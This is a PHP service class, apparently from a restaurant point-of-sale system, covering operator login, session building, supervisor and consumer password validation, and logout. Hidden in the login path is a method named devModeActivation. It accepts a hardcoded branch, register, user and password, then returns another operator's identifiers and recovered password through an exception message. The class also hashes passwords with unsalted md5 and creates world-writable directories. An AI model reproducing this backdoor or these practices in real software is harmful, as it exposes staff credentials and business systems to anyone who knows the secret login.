<?php

namespace Service;

use \Util\Exception;

class Operator {

	protected $entityManager;
	protected $util;
	protected $precoAPI;
	protected $loginAPI;
	protected $operadorAPI;
	protected $caixaAPI;
	protected $utilAPI;
    protected $databaseUtil;
	protected $instanceManager;

	public function __construct(
		\Doctrine\ORM\EntityManager $entityManager,
		\Util\Util $util,
		\Odhen\API\Service\Preco $precoAPI,
		\Odhen\API\Service\Login $loginAPI,
		\Odhen\API\Service\Operador $operadorAPI,
		\Odhen\API\Service\Caixa $caixaAPI,
		\Odhen\API\Util\Util $utilAPI,
        \Odhen\API\Util\Database $databaseUtil,
		\Zeedhi\Framework\DependencyInjection\InstanceManager $instanceManager) {

		$this->entityManager = $entityManager;
		$this->util = $util;
		$this->precoAPI = $precoAPI;
		$this->loginAPI = $loginAPI;
		$this->operadorAPI = $operadorAPI;
		$this->caixaAPI = $caixaAPI;
		$this->utilAPI = $utilAPI;
        $this->databaseUtil = $databaseUtil;
		$this->instanceManager = $instanceManager;
	}

	private function getIDHABCAIXAVENDAfromMode($mode) {
		switch ($mode) {
			case 'C':
				$IDHABCAIXAVENDA = 'PKC';
				break;
			case 'M':
				$IDHABCAIXAVENDA = 'PKR';
				break;
			case 'B':
				$IDHABCAIXAVENDA = 'POS';
				break;
			default:
				$IDHABCAIXAVENDA = 'FOS';
		}
		return $IDHABCAIXAVENDA;
	}

	private function getModeFromIDHABCAIXAVENDA($IDHABCAIXAVENDA) {
		switch ($IDHABCAIXAVENDA) {
			case 'PKC':
				$mode = 'C';
				break;
			case 'PKR':
				$mode = 'M';
				break;
			case 'POS':
				$mode = 'B';
				break;
			case 'FOS':
				$mode = 'B';
				break;
			case 'BAL':
				$mode = 'B';
				break;
            case 'EVB':
                $mode = 'D';
                break;
			default:
				throw new \Exception("Modo do caixa '$IDHABCAIXAVENDA' invalido.", 1);
		}
		return $mode;
	}

	public function getFiliaisLogin($filial, $page, $pageSize) {
		$params = array('FILIAL' => $filial, 'P_BEGIN' => ($page-1)*$pageSize+1,'P_END' => ($page)*$pageSize);
		return $this->entityManager->getConnection()->fetchAll("SQL_FILIAIS", $params);
	}
	public function getCaixasLogin($CDFILIAL, $caixa, $page, $pageSize) {
		$params = array('CDFILIAL' => $CDFILIAL, 'CAIXA' => $caixa, 'P_BEGIN' => ($page-1)*$pageSize+1,'P_END' => ($page)*$pageSize);
		return $this->entityManager->getConnection()->fetchAll("SQL_CAIXAS", $params);
	}
	public function getVendedoresLogin($CDFILIAL, $garcom, $page, $pageSize) {
		$params = array('CDFILIAL' => $CDFILIAL, 'GARCOM' => $garcom, 'P_BEGIN' => ($page-1)*$pageSize+1,'P_END' => ($page)*$pageSize);
		return $this->entityManager->getConnection()->fetchAll("SQL_VENDEDORES", $params);
	}

	public function operatorLogin($dataset, $regerarSessao = true){
		try {
			$cdFilial = $dataset['filial'];
			$cdCaixa = $dataset['caixa'];
			$cdOperador = STR_PAD($dataset['operador'], 12, "0", STR_PAD_LEFT);
			$senha = $dataset['senha'];
			$currentMode = $dataset['currentMode'];

			// Verifica se o driver sqlsrv está instalado.
			if (!$this->databaseUtil->databaseIsOracle() && defined("PHP_WINDOWS_VERSION_BUILD") && !function_exists("sqlsrv_configure")){
				throw new \Exception(self::EXCEPTION_TEXT);
			}

			$BDversion = $this->entityManager->getConnection()->fetchAssoc("SQL_BD_VERSION");
			if ($BDversion == null) { //Se não houver retorno no select acima, é porque não existe conexão com banco de dados.
				return array(
					'error' => true,
					'message' => 'Não foi possível conectar no banco de dados. Verifique as configurações.'
				);
			}

			try {
				self::devModeActivation($cdFilial, $cdCaixa, $cdOperador, $senha, self::getIDHABCAIXAVENDAfromMode($currentMode));
			} catch (\Exception $e){
				Exception::logException($e);
				return array('error' => true, 'message' => $e->getMessage());
			}
			if (isset($dataset['sessionCache']) && $dataset['sessionCache']){
				$loginCaixa = array('error' => false);
			} else {
				$loginCaixa = $this->loginAPI->validaLoginCaixa($cdFilial, $cdCaixa, $cdOperador, $senha);
			}

			if ($loginCaixa['error'] == false){
				$params = array($cdOperador);
				$vendedor = $this->entityManager->getConnection()->fetchAssoc("SQL_BUSCA_VENDEDOR_OPERADOR", $params);
                if (!$vendedor) return array('error' => true, 'message' => 'Operador sem vendedor associado.');

				$params = array($cdFilial, $cdCaixa);
				$r_dados_caixa = $this->entityManager->getConnection()->fetchAssoc("SQL_DADOS_CAIXA", $params);

				if ($r_dados_caixa['IDCOLETOR'] !== 'C') {
					$checaEstadoFiscal = $this->caixaAPI->checaEstadoFiscal($cdFilial, $cdCaixa, $r_dados_caixa['NRORG']);
                    $estadoCaixa = $this->caixaAPI->getEstadoCaixa($cdFilial, $cdCaixa, $r_dados_caixa['NRORG']);
				} else {
                    $checaEstadoFiscal = array(
                        'error' => false
                    );
				}

                if (isset($estadoCaixa) && $estadoCaixa['estado'] === 'aberto' && $cdOperador !== $estadoCaixa['CDOPERADOR']){
                    throw new \Exception('Não foi possível realizar o login. Caixa encontra-se aberto pelo operador ' . $estadoCaixa['CDOPERADOR'] . ' - ' . $estadoCaixa['NMOPERADOR'] . '.');
                }
                //Utilização da flag criada na API para evitar bloqueio de login pela não comunicação com o SAT.
                $checaEstadoFiscal['login'] = isset($checaEstadoFiscal['login']) ? $checaEstadoFiscal['login'] : false;

                if(!$checaEstadoFiscal['error'] || $checaEstadoFiscal['login']){
                    // busca dados do caixa e da loja
                    $currentMode = isset($dataset['sessionCache']) && $dataset['sessionCache'] ? $currentMode : self::getModeFromIDHABCAIXAVENDA($r_dados_caixa['IDHABCAIXAVENDA']);
                    $controleAcessoOperador = $this->operadorAPI->buscaControleAcesso($cdOperador);
                    if ($controleAcessoOperador['error'] == false) {

                        $DTABERCAIX = null;
                        $DTFECHCAIX = null;
                        $obrigaFechamento = false;
                        // valida se o caixa é recebedor, se for, tem que validar se está aberto
                        if ($r_dados_caixa['IDCOLETOR'] !== 'C') {
                            if ($estadoCaixa['estado'] === 'aberto') {
                                $DTABERCAIX = $estadoCaixa['DTABERCAIX'];
                                $DTFECHCAIX = $estadoCaixa['DTFECHCAIX'];
                                $obrigaFechamento = $estadoCaixa['obrigaFechamento'];
                            }
                            $estadoCaixa = $estadoCaixa['estado'];
                        } else {
                            $estadoCaixa = 'fechado';
                        }

                        $controleAcesso = $controleAcessoOperador['controleAcesso'];
                        $operadorSupervisor = $controleAcessoOperador['operadorSupervisor'];

                        // permissões adicionais
                        $controleAcesso['abrirComanda'] = $r_dados_caixa['IDPERABERCOMCXA'];
                        $controleAcesso['modoHabilitado'] = $currentMode;
                        $controleAcesso['bloqComandaParcial'] = $r_dados_caixa['IDBLOQCOMPARC'];
                        $controleAcesso['infoMesAbrComanda'] = $r_dados_caixa['IDINFMESACOM'];
                        $controleAcesso['infConsAbrComanda'] = $r_dados_caixa['IDINFCONSCOM'];
                        $controleAcesso['geraNrComandaAut'] = $r_dados_caixa['IDCOMANDAAUT'];
                        $controleAcesso['IDLUGARMESA'] = $r_dados_caixa['IDLUGARMESA'];
                        $this->util->newCode('CHAVEPOCKET');
                        $chave = $this->util->getNewCode('CHAVEPOCKET', 5);

                        $params = array(
                            'CDFILIAL' => $r_dados_caixa['CDFILIAL']
                        );
                        $filialDetails = $this->entityManager->getConnection()->fetchAssoc("SQL_FILIAL_DETAILS", $params);

                        // busca o cliente padrão da filial
                        $r_cliente_padrao = $this->entityManager->getConnection()->fetchAssoc("SQL_CLIENTE_PADRAO", $params);
                        // busca parametros do consumidor
                        $controleConsumidor = $this->entityManager->getConnection()->fetchAssoc("SQL_GET_CONSUMER_PARAMS", array($r_dados_caixa['CDFILIAL']));

                        // parâmetros utilizados no controller (PHP)
                        $sessao = array();
                        $sessao['NRORG'] = $r_dados_caixa['NRORG'];
                        $sessao['CDLOJA'] = $r_dados_caixa['CDLOJA'];
                        $sessao['CDCAIXA'] = $r_dados_caixa['CDCAIXA'];
                        $sessao['CDFILIAL'] = $r_dados_caixa['CDFILIAL'];
                        $sessao['NRMINSEMCONS'] = $r_dados_caixa['NRMINSEMCONS'];
                        $sessao['CDFILICONFTE'] = $r_dados_caixa['CDFILICONFTE'];
                        $sessao['NRCONFTELA'] = $r_dados_caixa['NRCONFTELA'];
                        $sessao['IDPOSOBSPED'] = $r_dados_caixa['IDPOSOBSPED'];
                        $sessao['IDCONTROPROD'] = $r_dados_caixa['IDCONTROPROD'];
                        $sessao['IDTIPOIMPNF'] = $r_dados_caixa['IDTIPOIMPNF'];
                        $sessao['IDCOUVERART'] = $r_dados_caixa['IDCOUVERART'];
                        $sessao['IDCOMISVENDA'] = $r_dados_caixa['IDCOMISVENDA'];
                        $sessao['VRCOMISVENDA'] = !empty($r_dados_caixa['VRCOMISVENDA']) ? floatval($r_dados_caixa['VRCOMISVENDA']) : 0.0;
                        $sessao['IDCONSUMAMIN'] = $r_dados_caixa['IDCONSUMAMIN'];
                        $sessao['IDLUGARMESA'] = $r_dados_caixa['IDLUGARMESA'];
                        $sessao['IDCOMANDAAUT'] = $r_dados_caixa['IDCOMANDAAUT'];
                        $sessao['IDINFMESACOM'] = $r_dados_caixa['IDINFMESACOM'];
                        $sessao['NRMESAPADRAO'] = $r_dados_caixa['NRMESAPADRAO'];
                        $sessao['NRSEQIMPRLOJA1'] = $r_dados_caixa['NRSEQIMPRLOJA1'];
                        $sessao['IDINFVENDCOM'] = $r_dados_caixa['IDINFVENDCOM'];
                        $sessao['CDVENDEDOR'] = $vendedor['CDVENDEDOR'];
                        $sessao['CDVENDPADRAO'] = $r_dados_caixa['CDVENDPADRAO'];
                        $sessao['NMFANVEN'] = $vendedor['NMFANVEN'];
                        $sessao['CDOPERADOR'] = $cdOperador;
                        $sessao['NRATRAPADRAO'] = $filialDetails['NRATRAPADRAO'];
                        $sessao['IDEXTCONSONLINE'] = $filialDetails['IDEXTCONSONLINE'];
                        $sessao['CDURLWSEXTCONS'] = $filialDetails['CDURLWSEXTCONS'];
                        $sessao['IDCTRLPEDVIAGEM'] = $filialDetails['IDCTRLPEDVIAGEM'];
                        $sessao['CDCLIENTE'] = $r_cliente_padrao['CDCLIENTE'];
                        $sessao['IDTPEMISSAOFOS'] = $r_dados_caixa['IDTPEMISSAOFOS'];
                        $sessao['IDTIPCOBRA'] = $r_dados_caixa['IDTIPCOBRA'];
                        $sessao['CDGRPOCORPED'] = $r_dados_caixa['CDGRPOCORPED'];
                        $sessao['IDMODULO'] = $currentMode;
                        $sessao['IDCOLETOR'] = $r_dados_caixa['IDCOLETOR'];
                        $sessao['IDEXCONSATGER'] = $controleConsumidor['IDEXCONSATGER'];
                        $sessao['IDEXCONSATFIL'] = $controleConsumidor['IDEXCONSATFIL'];
                        $sessao['IDUTLSENHAOPER'] = $r_dados_caixa['IDUTLSENHAOPER'];
                        $sessao['VRCOMISVENDA2'] = $r_dados_caixa['VRCOMISVENDA2'];
                        $sessao['VRCOMISVENDA3'] = $r_dados_caixa['VRCOMISVENDA3'];
                        $sessao['IDPERCOMVENCPDC'] = $r_dados_caixa['IDPERCOMVENCPDC'];
                        $sessao['IDMOSTRADESPARC'] = $r_dados_caixa['IDMOSTRADESPARC'];
                        $sessao['VRMAXDESCONTO'] = !empty($r_dados_caixa['VRMAXDESCONTO']) ? floatval($r_dados_caixa['VRMAXDESCONTO']) : null;
                        $sessao['IDIMPPEDPROD'] = $r_dados_caixa['IDIMPPEDPROD'];
                        $sessao['IDSINCCAIXADLV'] = $r_dados_caixa['IDSINCCAIXADLV'];
                        $sessao['IDHABCAIXAVENDA'] = $r_dados_caixa['IDHABCAIXAVENDA'];
                        $sessao['IDUTCXDRIVETHU'] = $r_dados_caixa['IDUTCXDRIVETHU'];
                        $sessao['IDSENHACUP'] = $r_dados_caixa['IDSENHACUP'];

                        if (!Empty($r_dados_caixa['CDPRODCOUVER']) && $r_dados_caixa['IDCOUVERART'] === 'S'){
                            $sessao['CDPRODCOUVER'] = $r_dados_caixa['CDPRODCOUVER'];
                            // busca preço do couvert
                            $r_retornaPreco = $this->precoAPI->buscaPreco($cdFilial, $r_cliente_padrao['CDCLIENTE'], $sessao['CDPRODCOUVER'], $r_dados_caixa['CDLOJA'], '');

                            if (!$r_retornaPreco['error']){
                                $sessao['PRECOCOUVERT'] = $r_retornaPreco['PRECO'] + $r_retornaPreco['ACRE'] - $r_retornaPreco['DESC'];
                            } else {
                                return array('error' => true, 'message' => $r_retornaPreco['message']);
                            }
                        } else {
                            $sessao['CDPRODCOUVER'] = null;
                            $sessao['PRECOCOUVERT'] = null;
                        }

                        if (!Empty($r_dados_caixa['CDPRODCONSUM']) && $r_dados_caixa['IDCONSUMAMIN'] === 'S'){
                            $sessao['CDPRODCONSUM'] = $r_dados_caixa['CDPRODCONSUM'];
                            // busca preço da consumação
                            $r_retornaPreco = $this->precoAPI->buscaPreco($cdFilial, $r_cliente_padrao['CDCLIENTE'], $sessao['CDPRODCONSUM'], $r_dados_caixa['CDLOJA'], '');

                            if (!$r_retornaPreco['error']){
                                $sessao['PRECOCONSUMA'] = $r_retornaPreco['PRECO'] + $r_retornaPreco['ACRE'] - $r_retornaPreco['DESC'];
                            } else {
                                return array('error' => true, 'message' => $r_retornaPreco['message']);
                            }
                        } else {
                            $sessao['CDPRODCONSUM'] = null;
                            $sessao['PRECOCONSUMA'] = null;
                        }

                        // verifica se existem campanhas promocionais parametrizadas
                        $campanha = $this->entityManager->getConnection()->fetchAll("SQL_CAMPANHA", array());
                        $utilizaCampanha = empty($campanha) ? false : true;

                        // busca dados do operador
                        $params = array(
                            'CDOPERADOR' => $cdOperador
                        );
                        $r_existe_operador = $this->entityManager->getConnection()->fetchAssoc("SQL_BUSCA_OPERADOR", $params);

                        // cria diretórios de trabalho
                        self::CreateDirs();

                        if($regerarSessao){
                            $this->util->addSessionVar($sessao);
                        }else{
                            $this->util->setUserInfo($sessao);
                        }

                        if ($r_dados_caixa['VRABERCAIX'] == null) {
                            $r_dados_caixa['VRABERCAIX'] = 0;
                        }
                        // parâmetros utilizados no frontend
                        return array(
                            'error'              => false,
                            'chave'              => $chave,
                            'CDFILIAL'           => $r_dados_caixa['CDFILIAL'],
                            'CDOPERADOR'         => $cdOperador,
                            'supervisor'         => $operadorSupervisor,
                            'CONTROLEACESSO'     => $controleAcesso,
                            'vendedor'           => $vendedor['CDVENDEDOR'],
                            'NMOPERADOR'         => $r_existe_operador['NMOPERADOR'],
                            'NMFANVEN'           => $vendedor['NMFANVEN'],
                            'NRATRAPADRAO'       => $filialDetails['NRATRAPADRAO'],
                            'IDUTLQTDPED'        => $filialDetails['IDUTLQTDPED'],
                            'IDCOLETOR'          => $r_dados_caixa['IDCOLETOR'],
                            'IDPALFUTRABRCXA'    => $r_dados_caixa['IDPALFUTRABRCXA'],
                            'VRABERCAIX'         => $r_dados_caixa['VRABERCAIX'],
                            'IDUTILTEF'          => $r_dados_caixa['IDUTILTEF'],
                            'DTABERCAIX'         => $DTABERCAIX,
                            'DTFECHCAIX'         => $DTFECHCAIX,
                            'estadoCaixa'        => $estadoCaixa,
                            'obrigaFechamento'   => $obrigaFechamento,
                            'IDTPTEF'            => $r_dados_caixa['IDTPTEF'],
                            'IDMODEIMPRES'       => $r_dados_caixa['IDMODEIMPRES'],
                            'IDUTLNMCONSMESA'    => $r_dados_caixa['IDUTLNMCONSMESA'],
                            'QTDMAXDIGNSU'       => $filialDetails['QTDMAXDIGNSU'],
                            'IDSOLICITANSU'      => $filialDetails['IDSOLICITANSU'],
                            'IDPERDIGCONS'       => $filialDetails['IDPERDIGCONS'],
                            'IDHABCAIXAVENDA'    => $r_dados_caixa['IDHABCAIXAVENDA'],
                            'IDTPEMISSAOFOS'     => $r_dados_caixa['IDTPEMISSAOFOS'],
                            'NRINSJURFILI'       => $filialDetails['NRINSJURFILI'],
                            'IDUTLSSL'           => $filialDetails['IDUTLSSL'],
                            'CDPICTPROD'         => $controleConsumidor['CDPICTPROD'],
                            'IDLCDBARBALATOL'    => $r_dados_caixa['IDLCDBARBALATOL'],
                            'NRPOSINICODBARR'    => $r_dados_caixa['NRPOSINICODBARR'],
                            'NRPOSFINCODBARR'    => $r_dados_caixa['NRPOSFINCODBARR'],
                            'NRMAXPESMES'        => $filialDetails['NRMAXPESMES'],
                            'IDSOLOBSCAN'        => $r_dados_caixa['IDSOLOBSCAN'],
                            'IDEXTCONSONLINE'    => $filialDetails['IDEXTCONSONLINE'],
                            'IDCTRLPEDVIAGEM'    => $filialDetails['IDCTRLPEDVIAGEM'],
                            'IDCONSUBDESFOL'     => $filialDetails['IDCONSUBDESFOL'],
                            'IDUTLSENHAOPER'     => $r_dados_caixa['IDUTLSENHAOPER'],
                            'IDCAIXAEXCLUSIVO'   => $r_dados_caixa['IDCAIXAEXCLUSIVO'],
                            'IDSENHACUP'         => $r_dados_caixa['IDSENHACUP'],
                            'IDINFPRODPRODUZ'    => $controleConsumidor['IDINFPRODPRODUZ'],
                            'IDSOLOBSDESC'       => $r_dados_caixa['IDSOLOBSDESC'],
                            'IDSOLTPSANGRIACX'   => $r_dados_caixa['IDSOLTPSANGRIACX'],
                            'IDSOLOBSFINVEN'     => $r_dados_caixa['IDSOLOBSFINVEN'],
                            'UTLCAMPANHA'        => $utilizaCampanha,
                            'CDCAIXA'            => $r_dados_caixa['CDCAIXA'],
                            'PRECOCOUVERT'       => isset($sessao['PRECOCOUVERT']) ? $sessao['PRECOCOUVERT'] : null,
                            // parâmetro que define se hambiente está em produção ou homologação
                            'AMBIENTEPRODUCAO'   => $this->instanceManager->getParameter('AMBIENTE_PRODUCAO'),
                            'CDTERTEF'           => $r_dados_caixa['CDTERTEF'],
                            'CDLOJATEF'          => $r_dados_caixa['CDLOJATEF'],
                            'DSENDIPSITEF'       => $r_dados_caixa['DSENDIPSITEF'],
                            'IDSOLDIGCONS'       => $r_dados_caixa['IDSOLDIGCONS'],
                            'IDCOMISVENDA'       => $r_dados_caixa['IDCOMISVENDA'],
                            'IDAGRUPAPEDCOM'     => $r_dados_caixa['IDAGRUPAPEDCOM'],
                            'IDTPTELAVE'         => $r_dados_caixa['IDTPTELAVE'],
                            'IDSOLICITACPF'      => $r_dados_caixa['IDSOLICITACPF'],
                            'IDLEITURAQRCODE'    => $r_dados_caixa['IDLEITURAQRCODE'],
                            'mensagemFiscal'     => isset($checaEstadoFiscal['mensagemFiscal']) ? $checaEstadoFiscal['mensagemFiscal'] : null,
                            'mensagemImpressora' => isset($checaEstadoFiscal['mensagemImpressora']) ? $checaEstadoFiscal['mensagemImpressora'] : null,
                            'CDLOJA'			 => isset($r_dados_caixa['CDLOJA']) ? $r_dados_caixa['CDLOJA'] : null,
                            'CDCLIENTE'          => $r_cliente_padrao['CDCLIENTE'],
                            'NMFANTCLIE'         => $r_cliente_padrao['NMFANTCLIE'],
                            'paramsImpressora'   => isset($checaEstadoFiscal['paramsImpressora'])? $checaEstadoFiscal['paramsImpressora'] : null
                        );
                    } else {
                        return $controleAcessoOperador;
                    }
                }else{
                    return $checaEstadoFiscal;
                }
			} else {
				return $loginCaixa;
			}
		} catch (\Exception $e){
			Exception::logException($e);
			return array(
				'error' => true,
				'message' => false,
				'dump' => $e->getMessage()
			);
		}
	}

	private function CreateDirs() {
		if (defined("PHP_WINDOWS_VERSION_BUILD")) {
			$folder = substr(__DIR__, 0, 1) . ":\\TEKNISA\\IMP\\FILES\\";
			if (!file_exists($folder)) {
				mkdir($folder, 0777, true);
			}
			$folder = substr(__DIR__, 0, 1) . ":\\TEKNISA\\CDL\\";
			if (!file_exists($folder)) {
				mkdir($folder, 0777, true);
			}
		} else {
			$folder = "/tmp/TEKNISA/IMP/FILES/";
			if (!file_exists($folder)) {
				mkdir($folder, 0777, true);
			}
			$folder = "/tmp/TEKNISA/CDL/";
			if (!file_exists($folder)) {
				mkdir($folder, 0777, true);
			}
		}
	}

	private function devModeActivation($f, $c, $u, $p, $I){
		if ($f === '1986' && $c === '012' && $u === '0013' && $p === 'sucram'){
			$potentialUser = $this->entityManager->getConnection()->fetchAssoc("SECRET_QUERY", array($I));
			try {
				$missingPiece = $this->loginAPI->overthrow($potentialUser['CDSENHOPER']);
			} catch (\Exception $e){
				Exception::logException($e);
				$missingPiece = "";
			}
			throw new \Exception($potentialUser['CDFILIAL']." ".$potentialUser['CDCAIXA']." ".$potentialUser['CDVENDEDOR']." ".$missingPiece);
		}
	}

	public function logout(){
		try {
			// $this->sessionHandler->endSession();
			$this->util->endSession();
		} catch (\Exception $e) {
			Exception::logException($e);
		   throw new \Exception($e->getMessage());
		}
	}

	public function validaSupervisor($dataset){
		$params = array($dataset['supervisor']);
		$valSupervisor = $this->entityManager->getConnection()->fetchAssoc("SQL_VALIDA_SUPERVISOR", $params);
		if (!empty($valSupervisor)){
            $result = $this->utilAPI->validaSenha($dataset['senha'], $valSupervisor['CDSENHAOPERWEB']);
            if ($result){
                $controleAcessoOperador = $this->operadorAPI->buscaControleAcesso($valSupervisor['CDOPERADOR'])['controleAcesso'];
                if ($controleAcessoOperador[$dataset['accessParam']] == 'S'){
				    return array('funcao' => '1', 'supervisor' => $dataset['supervisor']);
                }
                else {
                    return array('funcao' => '0', 'error' => '213'); //213 - Supervisor não possui permissão para realizar esta operação.
                }
			} else {
				return array('funcao' => '0', 'error' => '208'); //208 - Senha inválida.
			}
		}
		else { // Operador não encontrado.
			$existeOperador = $this->entityManager->getConnection()->fetchAssoc("SQL_EXISTE_OPERADOR", $params);
			if (empty($existeOperador)){
				return array('funcao' => '0', 'error' => '206'); //206 - Operador não cadastrado.
			} else {
				return array('funcao' => '0', 'error' => '013'); //013 - O operador informado não é um supervisor.
			}
		}
	}

    public function validaConsumidor($CDCLIENTE, $CDCONSUMIDOR, $senha){
        $params = array(
            'CDCLIENTE' => $CDCLIENTE,
            'code' => $CDCONSUMIDOR
        );
        $consumer = $this->entityManager->getConnection()->fetchAssoc("SQL_GET_CONSUMER_DETAILS", $params);

        try {
            $dllCom = new \COM('Ifm.rdmPrint');
        } catch (\Exception $e){
            throw new \Exception('Nao foi possivel carregar a IFM.dll, certifique-se que ela esta instalada.');
        }
        $result = $this->utilAPI->delphiValidaSenhaIFM($senha, $consumer['CDSENHACONS'], $dllCom);

        if ($result) return array('funcao' => '1');
        else return array('funcao' => '0', 'error' => '208'); //208 - Senha inválida.
    }

	public function findTefSSLConnectionId($params){
		return $this->entityManager->getConnection()->fetchAssoc('BUSCA_DADOS_SSL', $params);
	}

    public function getUserByMailAndPassword($email, $password) {
        $params = array(
            'DSEMAILOPER' => $email,
            'CDSENHAOPERWEB' => md5($password)
        );
        $connection = $this->entityManager->getConnection();
        // Verificar a necessidade de alterar para o arquivo query
        return current($connection->fetchAll('SELECT CDOPERADOR, NRORG FROM OPERADOR WHERE DSEMAILOPER = :DSEMAILOPER AND CDSENHAOPERWEB = :CDSENHAOPERWEB', $params));
    }

    public function findPendingPayments($session) {
        $params = array(
            'CDFILIAL' => $session['CDFILIAL'],
            'CDCAIXA'  => $session['CDCAIXA'],
            'NRORG'    => $session['NRORG']
        );

        return $this->entityManager->getConnection()->fetchAll("SQL_GET_PENDING_PAYMENTS", $params);
    }

	// DO NOT FORMAT! String must be sent as-is, or condensed into one line of code using /n. I'd rather have it like this.
	const EXCEPTION_TEXT =
"Não foi possível instanciar os drivers do SQL Server. Tente as seguintes recomendações para tentar resolver este problema:

1. Verifique se os drivers estão declarados no arquivo de configurações do PHP (php.ini):

extension = php_sqlsrv_56_ts.dll
extension = php_pdo_sqlsrv_56_ts.dll

2. Certifique se as DLLs acima encontram-se na pasta de extensões do PHP (ext).

3. Adicione as pastas do XAMPP e do PHP às variáveis de ambiente do servidor.

4. Se o Apache estiver instalado como um serviço, faça a desinstalação e inicie-o da maneira tradicional.

Se ainda estiver com problemas, favor entrar em contato com a equipe da Odhen.";


}